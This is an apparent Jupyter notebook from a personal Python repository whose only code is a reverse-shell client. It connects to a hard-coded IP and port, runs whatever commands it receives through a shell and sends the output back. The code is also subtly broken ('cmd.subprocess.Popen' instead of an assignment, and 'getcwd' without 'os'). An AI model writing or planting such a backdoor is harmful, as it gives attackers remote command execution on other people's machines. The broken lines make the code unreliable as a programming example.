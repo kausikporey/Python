{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import os\n",
    "import subprocess\n",
    "\n",
    "s = socket.socket()\n",
    "host = \"192.168.43.230\"\n",
    "port = 9999\n",
    "s.connect((host,port))\n",
    "\n",
    "while True:\n",
    "    data = s.recv(1024)\n",
    "    if data[:2].decode('utf-8') == 'cd':\n",
    "        os.chdir(data[3:].decode('utf-8'))\n",
    "    if len(data) > 0:\n",
    "        cmd.subprocess.Popen(data[:].decode('utf-8'),shell = True,stdout = subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)\n",
    "        output =cmd.stdout.read()  +  cmd.stderr.read()\n",
    "        output_str = str(output,'utf-8')\n",
    "        current_directory = getcwd()+'>'\n",
    "        s.send(str.encode(output_str + current_directory))\n",
    "        print(output)\n",
    "                    \n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
